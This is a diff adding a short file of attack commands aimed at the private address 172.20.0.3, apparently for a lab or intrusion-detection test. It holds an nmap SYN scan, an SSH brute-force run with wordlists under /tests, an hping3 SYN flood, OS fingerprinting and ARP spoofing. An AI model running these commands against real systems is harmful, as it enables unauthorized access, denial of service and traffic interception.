@@ -1,0 +1,17 @@
+#PORT SCAN
+nmap -sS 172.20.0.3
+
+#BRUTE FORCE SSH
+nmap -p 22 --script ssh-brute \
+  --script-args userdb=/tests/brute_force_file/username.txt,\
+passdb=/tests/brute_force_file/pwd.txt \
+  172.20.0.3
+
+#SYN FLOOD
+hping3 --flood -S -p 80 172.20.0.3
+
+#OS FINGERPRINTING
+nmap -O 172.20.0.3
+
+#ARP SPOOFING
+arpspoof -i eth0 -t 172.20.0.3 172.20.0.1
